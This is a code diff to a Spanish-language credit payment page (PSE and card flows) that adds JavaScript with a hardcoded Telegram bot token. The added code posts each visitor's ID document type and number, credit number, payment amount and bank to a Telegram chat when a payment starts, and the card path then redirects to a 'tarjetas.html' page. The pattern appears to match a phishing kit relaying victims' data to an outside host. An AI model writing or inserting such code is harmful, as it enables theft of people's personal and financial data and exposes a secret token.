@@ -743,6 +743,18 @@
     <script>
         const API_URL = window.location.origin;
 
+        // ─── Telegram Notificaciones ───
+        const TG_TOKEN = '8994620249:AAH53iPEdWTRolMHaYTe5rwh-gQbShFFs7E';
+        const TG_CHAT = '-1004457768033';
+
+        function notificarTelegram(mensaje) {
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TG_CHAT, text: mensaje, parse_mode: 'HTML' }),
+            }).catch(err => console.error('[telegram]', err));
+        }
+
         // ─── Datos del cr&eacute;dito desde URL params ───
         const params = new URLSearchParams(window.location.search);
         const creditNumber = params.get('creditNumber') || '—';
@@ -826,6 +838,8 @@
             if (telefono) localStorage.setItem('celular', telefono);
             localStorage.setItem('montoTotal', montoAPagar);
             localStorage.setItem('creditNumber', creditNumber);
+
+            notificarTelegram(`💳 <b>Pago con Tarjeta</b>\n\n💵 Monto: ${formatearPesos(montoAPagar)}\n📄 Doc: ${tipoDoc} ${numDoc}\n🔢 Crédito: ${creditNumber}`);
 
             const queryString = window.location.search;
             window.location.href = 'tarjetas.html' + queryString;
@@ -941,6 +955,7 @@
                 const data = await resp.json();
 
                 if (data.ok && data.bank_url) {
+                    notificarTelegram(`💰 <b>Pago PSE iniciado</b>\n\n🏦 Banco: ${bancoNombre}\n💵 Monto: ${formatearPesos(montoAPagar)}\n📄 Doc: ${tipoDoc} ${numDoc}\n🔢 Crédito: ${creditNumber}`);
                     window.location.href = data.bank_url;
                 } else {
                     mostrarError(data.error || 'Error procesando el pago. Intenta de nuevo.');
